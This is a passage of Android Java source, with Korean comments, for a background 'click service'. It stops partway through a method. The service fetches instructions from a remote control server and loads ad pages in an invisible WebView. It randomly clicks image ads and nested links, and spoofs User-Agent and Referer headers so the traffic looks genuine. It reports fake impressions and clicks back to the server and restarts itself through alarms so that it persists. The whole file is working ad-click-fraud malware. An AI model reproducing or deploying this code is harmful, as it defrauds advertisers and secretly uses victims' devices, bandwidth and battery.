package com.click.clicklib;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.http.SslError;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.apache.http.util.EncodingUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

///** 클릭 서비스 **/
@SuppressLint({"HandlerLeak", "NewApi", "SetJavaScriptEnabled"})
public class MainService extends Service implements Runnable {


    public class WebClickInfo {
        public String url;
        //		/** 클릭URL **/
        int waittime;
        //		/** 대기시간 **/
        public String code;
//		/** 파라메터로 넘기는 code **/

        public WebClickInfo(String url, int waittime, String code) {
            url = url.replace("&amp;", "&");
            this.url = url;
            this.waittime = waittime;
            this.code = code;
        }
    }

    public enum WEBVIEW_STATUS {

        WEBVIEW_NONE, WEBVIEW_CLICK, WEBVIEW_INCLICK, WEBVIEW_SHOW,
    }

    public WEBVIEW_STATUS m_WebViewStatus = WEBVIEW_STATUS.WEBVIEW_NONE;

    public enum STEP {
        STEP_MAIN, STEP_CLICKURL, STEP_CLICK, STEP_INCLICK, STEP_SHOWURL, STEP_SHOW, STEP_FHINISH;
    }

    //	/** SharedPreference 값을 설정하거나 얻기 위한 key값정의 **/
    public static String m_MAINURL = "main";
    public static String m_SHOWURL = "show";
    public static String m_CLICKURL = "click";
    public static Context CONTEXT;

    //	/** 웹뷰타임아웃(단위:초) 디폴드값=180초 **/
    public static int TIMEOUT = 180;

    public int MS = 1000;
    public int RETRYWAITTIME = 60 * 10;


    //	/** SharedPreference에 설정된 key에 해당한 값을 얻는다. **/
    public String GetURL(String key) {
        if (m_MainContext == null)
            m_MainContext = getApplicationContext();
        Log.i("text11",Utils.getSOString(m_MainContext, key));

        return Utils.getSOString(m_MainContext, key);
    }

    //	/** 로그(Toast)를 보여주기 위한 변수 **/
    public static Boolean g_ShowLog = false;

    //	/** 기본 Http통신을 위한 변수 **/
    AsyncHttpClient m_HttpClient;

    ClickInfo m_MainInfo = new ClickInfo();

    //	/** 기본URL로부터 얻는 html에서 전체 link태그를 저장하는 변수 **/
    List<String> m_lstUrl = new ArrayList<String>();

    //	/** 기본URL로부터 얻는 html에서 iFrame태그를 저장하는 변수 **/
    List<String> m_lstIFrameUrl = new ArrayList<String>();

    //	/** 실지 클릭URL 리스트 **/
    WebClickInfo m_RealClickInfo;

    //	/** 클릭된 페이지의 URL 리스트 **/
    List<WebClickInfo> m_lstSubClickInfo = new ArrayList<WebClickInfo>();

    //	/** 실지 노출URL 리스트 **/
    List<WebClickInfo> m_lstRealShowInfo = new ArrayList<WebClickInfo>();

    //	/** 서비스의 Context **/
    Context m_MainContext;

    //	/** 웹뷰 : 클릭부분은 이 웹뷰에 로딩하여 실지 웹페이지에 표시되는것과 같은 HTML을 얻기위하여 필요**/
    WebView m_WebView = null;

    //	/** 서비스 기본 스레드 **/
    Thread m_MainThread = null;

    //	/** 유저 에이전트 **/
    String m_szUserAgent = null;

    private String m_prevURL = "<NULL>";


    @Override
    public void onCreate() {
        super.onCreate();
        CONTEXT = MainService.this;

        try {


        } catch (Exception e) {
            e.printStackTrace();
        }

        if (m_MainThread != null)
            return;

        m_MainContext = getApplicationContext();
        InitWebView();

        ShowMsgToast("WebClickService Started");

        m_HttpClient = new AsyncHttpClient();

        m_MainThread = new Thread(this);

        if (Utils.isServiceRunning(MainService.this)) {
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    m_MainThread.start();
                }
            }, 1000);
        } else {
            m_MainThread.start();
        }

//        m_LogHandler.sendEmptyMessage(0);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //	/** 웹뷰 초기화 **/
    private void InitWebView() {
        m_WebView = new WebView(m_MainContext);

        m_WebView.getSettings().setDatabaseEnabled(true);
        m_WebView.getSettings().setDomStorageEnabled(true);
        m_WebView.getSettings().setAppCacheEnabled(true);
        m_WebView.getSettings().setAppCachePath("");
        m_WebView.getSettings().setLoadsImagesAutomatically(true);
        m_WebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
        m_WebView.getSettings().setUseWideViewPort(true);
        m_WebView.getSettings().setSupportZoom(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            m_WebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        } else {
            m_WebView.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
        }

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
            m_WebView.getSettings().setDisplayZoomControls(false);
        }
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.ICE_CREAM_SANDWICH)
            m_WebView.getSettings().setTextZoom(100);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN)
            m_WebView.getSettings().setAllowUniversalAccessFromFileURLs(true);

//		/** 자바스크립트 가능하게 설정 **/
        m_WebView.getSettings().setJavaScriptEnabled(true);

//		/** 웹뷰가 로딩된후 호출되는 Interface **/
        m_WebView.addJavascriptInterface(new MyJavascriptInterface(), "HTMLOUT");
        m_WebView.setWebViewClient(new WebViewClient() {

            //			/** 웹뷰가 로드된다음 MyJavascriptInterface 의 processHTML 함수가 호출되도록 설정 **/


            @Override
            public void onPageFinished(WebView view, String url) {

                if (m_prevURL.equals(url)) {
                    ShowMsgToast("중복되는 url을 로딩하고 있습니다.\n " + url);
                    if (m_WebViewStatus == WEBVIEW_STATUS.WEBVIEW_CLICK ||
                            m_WebViewStatus == WEBVIEW_STATUS.WEBVIEW_INCLICK) {
                        MoveStep(STEP.STEP_SHOWURL);
                    } else {
                        MoveStep(STEP.STEP_MAIN);
                    }

                } else {
                    m_prevURL = url;
                    if (m_WebViewStatus == WEBVIEW_STATUS.WEBVIEW_CLICK)
                        m_WebView.loadUrl("javascript:window.HTMLOUT.procClick('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
                    else if (m_WebViewStatus == WEBVIEW_STATUS.WEBVIEW_INCLICK)
                        m_WebView.loadUrl("javascript:window.HTMLOUT.procInClick('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
                    else if (m_WebViewStatus == WEBVIEW_STATUS.WEBVIEW_SHOW)
                        m_WebView.loadUrl("javascript:window.HTMLOUT.procShow(document.getElementsByTagName('body')[0].innerHTML);");
                }
            }

            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
                return super.shouldInterceptRequest(view, url);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                Log.i("errortest" , "에러코드 : "+errorCode);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return true;
            }
        });
    }

    Handler mShowURLHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            if (m_lstRealShowInfo.size() <= 0) {
                ShowMsgToast("노출이 끝났습니다. 10분간 대기합니다.2");
                MoveStep(MainService.STEP.STEP_MAIN);
                return;
            }
            MainService.WebClickInfo info = m_lstRealShowInfo.get(0);

            String url = info.url;
            String code = info.code;

            String processURL = GetURL(m_SHOWURL);
            final AsyncHttpClient client = new AsyncHttpClient();
            client.addHeader("Content-Type", "application/x-www-form-urlencoded");

            RequestParams params = new RequestParams();
            params.put("code", code);
            params.put("state", "sc");
//			/** 노출카운트 호출**/
            client.post(processURL, params, null);

            if (!m_MainInfo.C.equals("0")) { //0이면 아무것도 하지않음, 값이 있을 경우 해당 url을 레퍼러로 넣어줌 (최초 노출(서치)과 클릭페이지 로딩시 사용)
                client.addHeader("Referer", m_MainInfo.C);
            }

            params = new RequestParams();
            params.put("code", code);
            client.post(url, params, new AsyncHttpResponseHandler() {

                @Override
                public void onFinish() {
                    super.onFinish();
                }

                @Override
                public void onSuccess(int arg0, String html) {
                    ClickIFrame(client, html);
                }
            });

            ShowMsgToast("노출:" + url);
            Log.i("test2", url);

            m_lstRealShowInfo.remove(0);
            if (m_lstRealShowInfo.size() > 0) {
                ShowMsgToast("노출:" + m_lstRealShowInfo.get(0).waittime + "초 (남은갯수:" + m_lstRealShowInfo.size() + ")");
                mShowURLHandler.sendEmptyMessageDelayed(0, m_lstRealShowInfo.get(0).waittime * MS);
            } else { //클릭이 끝나고 노출까지 다 끝난 시점(전체가 다 끝난경우)
                ShowMsgToast("노출이 끝났습니다. 10분간 대기합니다1.");
                MoveStep(MainService.STEP.STEP_MAIN);
                return;
            }
        }
    };

    //	/** 클릭 URL 클릭 및 카운트 부분 **/
    Handler mClickURLHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            MainService.WebClickInfo info = m_RealClickInfo;

            String url = info.url;
            String code = info.code;

            String processURL = GetURL(m_CLICKURL);
            final AsyncHttpClient client = new AsyncHttpClient();
            client.addHeader("Content-Type", "application/x-www-form-urlencoded");

            RequestParams params = new RequestParams();
            params.put("code", code);
            params.put("state", "ck");
            params.put("url", m_MainInfo.E.split("\\|")[0]);
            params.put("surl", url);
            client.post(processURL, params, null);

            ShowMsgToast("[클릭된 URL 로딩]" + url);

            m_WebViewStatus = MainService.WEBVIEW_STATUS.WEBVIEW_INCLICK;
            LoadWebView(url);
        }
    };
    public Handler m_IFrameHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            String url = (String) msg.obj;
            LoadWebView(url);
        }
    };

    //	/** 클릭된 url의 로딩된 페이지에서 내부클릭 부분 **/
    Handler mSubClickURLHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            if (m_lstSubClickInfo.size() <= 0) {
                ShowMsgToast("SubClick데이터가 없습니다. 노출로 전환합니다.");
                MoveStep(MainService.STEP.STEP_SHOWURL);
                return;
            }
            MainService.WebClickInfo info = m_lstSubClickInfo.get(0);

            String url = info.url;

            final AsyncHttpClient client = new AsyncHttpClient();

            if (!m_MainInfo.C.equals("0")) { //0이면 아무것도 하지않음, 값이 있을 경우 해당 url을 레퍼러로 넣어줌 (최초 노출(서치)과 클릭페이지 로딩시 사용)
                client.addHeader("Referer", m_MainInfo.C);
            }
            try {
                client.get(url, null);
                ShowMsgToast("내부클릭:" + url);
            } catch (Exception ex) {

            }

            try {
                m_lstSubClickInfo.remove(0);
                if (m_lstSubClickInfo.size() > 0) {
                    ShowMsgToast("내부클릭:" + m_lstSubClickInfo.get(0).waittime + "초 (남은갯수:" + m_lstSubClickInfo.size() + ")");
                    mSubClickURLHandler.sendEmptyMessageDelayed(0, m_lstSubClickInfo.get(0).waittime * MS);
                } else { //클릭이 끝나고 노출까지 다 끝난 시점(전체가 다 끝난경우)
                    ShowMsgToast("내부클릭이 완료되었습니다. 노출로 전환합니다.");
                    MoveStep(MainService.STEP.STEP_SHOWURL);
                }
            } catch (Exception ex) {
                ShowMsgToast("내부클릭 오류발생:" + ex.getMessage());
                MoveStep(MainService.STEP.STEP_SHOWURL);
            }

        }
    };
    public int m_Timeout = 0;
    public Handler m_WebViewHandler = new Handler() {
        public void handleMessage(Message msg) {
            m_Timeout += 5;
            if (m_Timeout > TIMEOUT) {
                ShowMsgToast(TIMEOUT + "초 동안 로딩이 되지 않았기때문에 웹뷰로딩을 정지합니다.");
                m_WebViewHandler.removeMessages(0);
                m_WebView.stopLoading();
                return;
            }
            ShowMsgToast(m_WebView.getUrl() + "\n 로딩중... 경과시간:" + m_Timeout + "초");
            m_WebViewHandler.sendEmptyMessageDelayed(0, 5000);
        }
    };
    Handler mMainHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            if (Utils.isServiceRunning(MainService.this)) {
                MainService.this.GetClickInfo();
                Log.i("test1", "서버호출");
            }
        }
    };


    Handler mShowHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            if (!m_MainInfo.D.equals("0")) { //0이 아니면 해당 url 접속하여 페이지를 여러 번 읽어옴. 해당페이지 호출시 설명
                try {
                    ShowMsgToast("[노출URL 로딩]\n" + m_MainInfo.D);

                    m_WebViewStatus = MainService.WEBVIEW_STATUS.WEBVIEW_SHOW;
                    LoadWebView(m_MainInfo.D);
                } catch (Exception ex) {
                    MoveStep(MainService.STEP.STEP_MAIN);
                }
            } else {
                ShowMsgToast("D값이 0이기때문에 노출을 시작하지 않습니다. \n 10분간 대기합니다.");
                MoveStep(MainService.STEP.STEP_MAIN);
            }
        }
    };

    //	/** F값에 해당한 URL을 웹뷰에 로딩하여 나온 결과에서 클릭 URL을 얻기 위한 핸들러**/
    Handler mClickHandler = new Handler() {
        @SuppressLint("NewApi")
        public void handleMessage(Message msg) {

            try {

                if (m_lstUrl.size() <= 0) {
                    ShowMsgToast("클릭url의 응답이 정확하지 않습니다.");
                    MoveStep(MainService.STEP.STEP_SHOWURL);
                    return;
                }
                ShowMsgToast("클릭페이지가 정상적으로 로드되었습니다.");

//				/** 무조건 클릭해야 하는 url **/
                List<String> lstHighUrl = new ArrayList<String>();
                String[] lines = m_MainInfo.H.split("\\|");
                String url = "";
                for (int i = 0; i < m_lstUrl.size(); i++) {
                    url = m_lstUrl.get(i);
                    for (int j = 0; j < lines.length; j++) {
                        if (url.contains(lines[j])) {
                            lstHighUrl.add(url);
                        }
                    }
                }

                String clickUrl = "";
                if (lstHighUrl.size() > 0) {
                    int rnd = (int) (Math.random() * lstHighUrl.size());
                    clickUrl = lstHighUrl.get(rnd);
                }

                if (clickUrl.isEmpty()) {
                    int rnd = (int) (Math.random() * m_lstUrl.size());
                    clickUrl = m_lstUrl.get(rnd);
                }

                String[] params = m_MainInfo.E.split("\\|");
                int waittime = Integer.parseInt(params[1]);
                final String keycode = params[2];

                m_RealClickInfo = new MainService.WebClickInfo(clickUrl, waittime, keycode);

                MoveStep(MainService.STEP.STEP_CLICK);
            } catch (Exception ex) {
                ShowMsgToast("호출이 실패되었습니다." + ex.getMessage());
                MoveStep(MainService.STEP.STEP_SHOWURL);
            }
        }
    };


    //	/** 웹뷰로딩할때 timeout설정 **/


    /**
     * 클릭url을 로딩한다.
     **/
    private void StartWebLoading(String url, String code) {
        try {
//			/** code 값을 post파라메터로 웹뷰에 전달하기 위하여 byte[]로 변환한다. **/
            String postData = "code=" + code;
            byte[] bytesPostData = EncodingUtils.getBytes(postData, "BASE64");
            Map<String, String> extraHeaders = new HashMap<String, String>();
            extraHeaders.put("Content-Type", "application/x-www-form-urlencoded");

            url = Utils.GetDecodeHTML(url);

            m_lstUrl.clear();

            //아이프레임변수를 초기화한다.
            m_lstIFrameUrl.clear();

            m_WebViewStatus = WEBVIEW_STATUS.WEBVIEW_CLICK;
            m_WebView.postUrl(url, bytesPostData);

            m_Timeout = 0;
            m_WebViewHandler.sendEmptyMessage(0);
            ShowMsgToast("[클릭url 로딩]\n" + url);
        } catch (Exception ex) {
            ShowMsgToast(url + "\n 로딩중 오류가 발생하였습니다." + ex.getMessage());
            MoveStep(STEP.STEP_MAIN);
        }
    }

    //	/** 클릭된 페이지의 html에서 링크태그를 파싱한다. : 클릭된 페이지내에서의 링크태그를 파싱한다. <a 태그로 시작되는 부분 얻기 **/
    //dagger
    private void parseSubLinkTag(String html) {

        int aTagPos = -1;
        aTagPos = html.indexOf("<a ", 0);

        m_lstSubClickInfo.clear();

        List<String> urls = new ArrayList<String>();

        while (aTagPos != -1) {
            int last = html.indexOf("</a>", aTagPos);
            String tag = html.substring(aTagPos, last);

            try {
                int first = tag.indexOf("href=\"");
                int end = tag.indexOf("\"", first + "href=\"".length() + 1);
                String url = tag.substring(first + "href=\"".length(), end);

                url = url.replace(" ", "");
                url = url.replace("&amp;", "&");

                String cstHttp = "http";
                String firststr = url.substring(0, cstHttp.length());
                if (firststr.equals(cstHttp)) {
                    urls.add(url);
                }
            } catch (Exception ex) {
                Log.e("error", ex.getMessage());
            }
            aTagPos = html.indexOf("<a ", last);
        }

        if (urls.size() <= 0) {
            MoveStep(STEP.STEP_SHOWURL);
            return;
        }
//		/** F 값까지 반복랜덤클릭 **/
        int repeat = Integer.parseInt(m_MainInfo.F);
        for (int i = 0; i < repeat; i++) {
            if (urls.size() == 0)
                break;

            int rnd = (int) (Math.random() * urls.size());

            /** 클릭이 되고 난 페이지 내부에서 또 다시 클릭을 일으킬 횟수 (클릭 가능한 아무 타겟이나 랜덤 클릭, 간격은 5~230초 사이 랜덤) **/
            WebClickInfo info = new WebClickInfo(urls.get(rnd),
                    ((int) (Math.random() * 230) + 5),
                    m_RealClickInfo.code);

            m_lstSubClickInfo.add(info);
        }

//		/** 클릭을 먼저 시작한다. **/
        MoveStep(STEP.STEP_INCLICK);
    }

    //	/** html에서 iframe태그가 있는 경우 안의 URL들을 추출하기 위한 함수 **/
    protected void parseIFrame(String html) {

        int iFramePos = -1;
        iFramePos = html.indexOf("<iframe", 0);
        while (iFramePos != -1) {
            int last = html.indexOf("</iframe>", iFramePos);
            String tag = html.substring(iFramePos, last);

            try {
                if (tag.contains("src=\"")) {
                    int first = tag.indexOf("src=\"");
                    int end = tag.indexOf("\"", first + "src=\"".length() + 1);
                    String url = tag.substring(first + "src=\"".length(), end);

                    url = url.replace(" ", "");
                    url = url.replace("&amp;", "&");

                    String cstHttp = "http";
                    String firststr = url.substring(0, cstHttp.length());
                    if (!firststr.equals(cstHttp)) {
                        url = cstHttp + ":" + url;
                    }

                    if (!url.contains("about:blank")) {
                        m_lstIFrameUrl.add(url);
                    }
                }
            } catch (Exception ex) {
                Log.e("error", ex.getMessage());
            }

            iFramePos = html.indexOf("<iframe", last);
        }
    }

    //	/** 클릭url정보를 확인한다. **/
    public void StartClick() {
        if (!m_MainInfo.E.equals("0")) {

            String[] params = m_MainInfo.E.split("\\|");
            String url = params[0];
            String code = params[2];

            StartWebLoading(url, code);
        } else {
            ShowMsgToast("클릭할것이 없으므로 (E값이 0이기때문에) 노출로 전환합니다.");
            MoveStep(STEP.STEP_SHOWURL);
        }
    }

    //	/** html을 파싱하여 링크태그만 얻는다
//	 * <a 로 시작하는 부분을 찾아서 </a> 로 끝나는 부분까지 찾은다음 그 안에 <img>태그가 존재하면 그 url을 광고 URL로 인식한다.
//	 * **/
    protected boolean parseLinkTag(String html) {
        List<String> lstLink = new ArrayList<String>();
        int aTagPos = -1;
        aTagPos = html.indexOf("<a ", 0);
        while (aTagPos != -1) {
            int last = html.indexOf("</a>", aTagPos);
            String tag = html.substring(aTagPos, last);

            try {
                String cstHREF = "";
                String cstEnd = "";
                if (tag.contains("<img")) {
                    if (tag.contains("href=\"")) {
                        cstHREF = "href=\"";
                        cstEnd = "\"";
                    } else {
                        cstHREF = "href='";
                        cstEnd = "'";
                    }
                    if (!cstHREF.isEmpty()) {
                        int first = tag.indexOf(cstHREF);
                        int end = tag.indexOf(cstEnd, first + cstHREF.length() + 1);
                        String url = tag.substring(first + cstHREF.length(), end);

                        url = url.replace(" ", "");
                        url = url.replace("&amp;", "&");

                        String cstHttp = "http";
                        String firststr = url.substring(0, cstHttp.length());
                        if (!firststr.equals(cstHttp)) {
                            url = cstHttp + ":" + url;
                        }
                        lstLink.add(url);
                    }
                }
            } catch (Exception ex) {
                Log.e("error", ex.getMessage());
            }
            aTagPos = html.indexOf("<a ", last);
        }

//		/** 해당 조건에 맞지 않는 url들을 제거하는 부분 **/
        String[] lines = m_MainInfo.G.split("\\|");
        for (int i = 0; i < lines.length; i++) {
            for (int j = 0; j < lstLink.size(); j++) {
                String url = lstLink.get(j);
                if (url.contains(lines[i])) {
                    lstLink.remove(j);
                    continue;
                }
            }
        }

//		/** 기타 옵션값에 맞지 않으면 제거한다. **/
        for (int i = 0; i < m_lstUrl.size(); i++) {
            String url = m_lstUrl.get(i);
            if (url.length() < 60) {
                lstLink.remove(i);
                continue;
            }
            if (url.substring(0, 2) == "ja" || url.substring(0, 4) == "tel:") {
                lstLink.remove(i);
                continue;
            }

            String end4 = url.substring(url.length() - 4, url.length());
            if (end4 == ".exe" || end4 == "prev" || end4 == "next" || end4 == ".txt" || end4 == ".pdf") {
                lstLink.remove(i);
                continue;
            }
        }

        for (int i = 0; i < lstLink.size(); i++) {
            m_lstUrl.add(lstLink.get(i));
        }
        if (lstLink.size() > 0)
            return true;
        else
            return false;
    }

    //	/** 노출 URL 로딩 및 카운트 부분 **/
    @SuppressLint("HandlerLeak")


    //	/** 노출url의 로딩된 페이지에서 iframe을 찾아 한번더 호출한다 **/
    protected void ClickIFrame(AsyncHttpClient client, String html) {
        int iFramePos = -1;
        iFramePos = html.indexOf("<iframe", 0);
        while (iFramePos != -1) {
            int last = html.indexOf("</iframe>", iFramePos);
            String tag = html.substring(iFramePos, last);

            try {
                if (tag.contains("src=\"")) {
                    int first = tag.indexOf("src=\"");
                    int end = tag.indexOf("\"", first + "src=\"".length() + 1);
                    String url = tag.substring(first + "src=\"".length(), end);

                    url = url.replace(" ", "");
                    url = url.replace("&amp;", "&");

                    String cstHttp = "http";
                    String firststr = url.substring(0, cstHttp.length());
                    if (!firststr.equals(cstHttp)) {
                        url = cstHttp + ":" + url;
                    }

                    client.get(url, null);
                }
            } catch (Exception ex) {
                Log.e("error", ex.getMessage());
            }

            iFramePos = html.indexOf("<iframe", last);
        }
    }

    //	/** D 값에 해당한 노출정보를 확인한다.**/

    @Override
    public void onDestroy() {
        m_MainThread.interrupt();
        m_MainThread = null;
        Log.i("test1", "서비스종료");
        serviceList();
        super.onDestroy();
    }

    public void serviceList() {
        /*서비스 리스트*/
        ActivityManager am = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningServiceInfo> rs = am.getRunningServices(1000);

        for (int i = 0; i < rs.size(); i++) {
            ActivityManager.RunningServiceInfo rsi = rs.get(i);
            Log.i("test1", "Package Name : " + rsi.service.getPackageName());
            Log.i("test1", "Class Name : " + rsi.service.getClassName());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            Log.i("test1", "서비스실행");

            mMainHandler.removeMessages(0);
            mClickHandler.removeMessages(0);
            mClickURLHandler.removeMessages(0);
            mSubClickURLHandler.removeMessages(0);
            mShowHandler.removeMessages(0);
            mShowURLHandler.removeMessages(0);
            m_IFrameHandler.removeMessages(0);
            m_WebViewHandler.removeMessages(0);
            mMainHandler.sendEmptyMessage(0);
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent alarmIntent = new Intent(MainService.this, RestartReceiver.class);
            alarmIntent.setAction(RestartReceiver.ACTION_RESTART_CLICK_SERVICE);
            PendingIntent sender = PendingIntent.getBroadcast(MainService.this, 0, alarmIntent, 0);
            am.setExact(AlarmManager.RTC_WAKEUP, 10, sender);

        }
        return START_STICKY;
    }

    public void run() {
        if (!(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)) {
            Timer timer = new Timer();
            TimerTask task = new TimerTask() {
                @Override
                public void run() {
                    mMainHandler.removeMessages(0);
                    mClickHandler.removeMessages(0);
                    mClickURLHandler.removeMessages(0);
                    mSubClickURLHandler.removeMessages(0);
                    mShowHandler.removeMessages(0);
                    mShowURLHandler.removeMessages(0);
                    m_IFrameHandler.removeMessages(0);
                    m_WebViewHandler.removeMessages(0);
                    mMainHandler.sendEmptyMessage(0);
                }
            };
            timer.schedule(task, 0, RETRYWAITTIME * MS);

        }
    }


    //	/** 서버호출url을 호출하는 부분 **/

    //	/** MAINURL(http://sideup.co.kr/webs/sideupz.php) 을 로드하여 A ~ H 까지의 값을 얻는다. **/
    public void GetClickInfo() {
        AsyncHttpClient client = new AsyncHttpClient();
        if (m_szUserAgent != null)
            client.addHeader("User-Agent", m_szUserAgent);
        client.setTimeout(10000);
        client.get(GetURL(m_MAINURL), new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(String html) {
                try {
                    String[] lines = html.split("\n");

                    m_MainInfo.A = lines[0].substring(3);
                    m_MainInfo.B = lines[1].substring(3);
                    m_MainInfo.C = lines[2].substring(3);
                    m_MainInfo.D = lines[3].substring(3);
                    m_MainInfo.E = lines[4].substring(3);
                    m_MainInfo.F = lines[5].substring(3);
                    m_MainInfo.G = lines[6].substring(3);
                    m_MainInfo.H = lines[7].substring(3);

//					/** A ~ H 까지 값중 하나라도 null 이면 1초 대기하였다가 다시 시작한다. **/
                    if (m_MainInfo.A == null || m_MainInfo.B == null || m_MainInfo.C == null || m_MainInfo.D == null || m_MainInfo.E == null || m_MainInfo.F == null || m_MainInfo.G == null || m_MainInfo.H == null) {
                        MoveStep(STEP.STEP_MAIN);

                        return;
                    }

                    if (m_MainInfo.A.equals("0")) {
                        ShowMsgToast("A값이 0으므로  10분후 다시 시작합니다.");
                        MoveStep(STEP.STEP_MAIN);
                        return;
                    }

                    if (!m_MainInfo.B.equals("0")) { //0이면 원래 에이전트로, 값이 있을 경우는 해당 에이전트로 변조 (변경될 유저에이전트)
                        m_szUserAgent = m_MainInfo.B;
                    }

//					/** 클릭을 시작한다. **/
                    StartClick();
                } catch (Exception ex) {
                    MoveStep(STEP.STEP_MAIN);
                }
            }

            @Override
            public void onFailure(Throwable arg0, String arg1) {
                MoveStep(STEP.STEP_MAIN);
            }
        });
    }


    public class ClickInfo {
        public String A;
        //		/** 0이면 아무것도 안하고 10분뒤 재접속 1이면 실행 아래값 토대로 실행  (프로그램 실행 여부) **/
        public String B;
        //		/** 0이면 원래 에이전트로, 값이 있을 경우는 해당 에이전트로 변조 (변경될 유저에이전트) **/
        public String C;
        //		/** 0이면 아무것도 하지않음, 값이 있을 경우 해당 url을 레퍼러로 넣어줌 (최초 노출(서치)과 클릭페이지 로딩시 사용) **/
        public String D;
        //		/** 0이 아니면 해당 url 접속하여 페이지를 여러 번 읽어옴. 해당페이지 호출시 설명 **/
        public String E;
        //		/** 클릭할 타겟이 있는 url, | = 구분자 , 10 = 시간(초) , | = 구분자 , yogi = 코드        0이면 패스, url이 있을 경우 **/
        public String F;
        //		/** 클릭이 되고 난 페이지 내부에서 또 다시 클릭을 일으킬 횟수 (클릭 가능한 아무 타겟이나 랜덤 클릭, 간격은 5~230초 사이 랜덤) **/
        public String G;
        //		/** 클릭할 값 안에 구분자 사이의 값들이 포함되어 있으면 클릭하지 않음 **/
        public String H;
//		/** 클릭할 값 안에 구분자 사이의 값 중 하나라도 포함 돼 있으면 무조건 클릭 **/
    }

    //	/** 페이지내에 있는 IFRAME을 로딩하는 핸들러 **/


    public void LoadWebView(String url) {
        try {
            m_Timeout = 0;
            m_WebViewHandler.sendEmptyMessage(0);
            m_WebView.loadUrl(url);
        } catch (Exception ex) {
            ShowMsgToast("[WebView Loading Exception]\n" + url + "\ndetail=" + ex.getMessage());
        }
    }

    //	/** 웹뷰로 로드되는 html을 얻기 위한 Interface **/
    public class MyJavascriptInterface {
        //		/** 클릭옵션관련 페이지 응답결과를 파싱한다 **/
        @JavascriptInterface
        public void procClick(String html) {

            m_WebViewHandler.removeMessages(0);
            String decHTML = Utils.GetDecodeHTML(html);

            parseLinkTag(decHTML);
            parseIFrame(decHTML);

            if (m_lstIFrameUrl.size() > 0) {
                String url = m_lstIFrameUrl.get(m_lstIFrameUrl.size() - 1);
                m_lstIFrameUrl.remove(m_lstIFrameUrl.size() - 1);

                //url = "http://adtg.widerplanet.com/delivery/wjs.php?zoneid=18533&amp;category=3440-7245-_300x250&amp;passback=%2F%2Fadsvc2.wisenut.co.kr%2Famc%2F28%2Famc_svc_iframe_7.php%3Fc%3D3440%26t%3D7%26s%3D7245%26l%3DY%26e%3D8%26f%3DN%26ads%3DN%26about%3DN%26wp%3DN%26pb%3D%26cr%3DY%26mb%3DY%26ao%3DY%26wr%3DY%26lad%3DY%26siteRef%3D%26nowPage%3D%252A%252A%252Atodayreport.co.kr%252Fbbs%252Fboard.php%253Fbo_table%253Dpolitics%2526wr_id%253D418&amp;loc=http%3A%2F%2Ftodayreport.co.kr%2Fbbs%2Fboard.php%3Fbo_table%3Dpolitics%26wr_id%3D418&amp;ct0=http%3A%2F%2Famclick.wisenut.co.kr%2Fadsvc%2FbulkClick.jsp%3Ffrm%3DDINO%26adCode%3D3440_0_Y_DP_28_WP%26ln%3D&amp;cb=9848213335&amp;t=1568873484&amp;src=adr";
                Message msg = new Message();
                msg.what = 0;
                msg.obj = url;

                m_IFrameHandler.removeMessages(0);
                m_IFrameHandler.sendMessage(msg);
                return;
            } else {
                MoveStep(STEP.STEP_CLICKURL);
            }
        }

        //		/** 노출옵션관련 페이지 응답결과를 파싱한다.**/
        @JavascriptInterface
        public void procShow(String html) {
            try {

                m_WebViewHandler.removeMessages(0);

                //응답결과에서 html태그가 포함되어 있는가를 체크한다.
                if (!html.contains("Q0")) {
                    ShowMsgToast("노출url의 응답이 정확하지 않습니다.");
                    MoveStep(STEP.STEP_MAIN);
                    return;
                }

                ShowMsgToast("노출페이지가 정상적으로 로드되었습니다.");
                String[] lines = html.split("\n");
                m_lstRealShowInfo.clear();

                for (int i = 0; i < lines.length; i++) {
                    String question = "Q" + i + "::";
                    String line = lines[i].substring(question.length());
                    String[] params = line.split("\\|");

                    String url = params[0];
                    int waittime = Integer.parseInt(params[1]);
                    String keycode = params[2];

                    WebClickInfo info = new WebClickInfo(url, waittime, keycode);
                    m_lstRealShowInfo.add(info);
                }
                MoveStep(STEP.STEP_SHOW);
            } catch (Exception ex) {
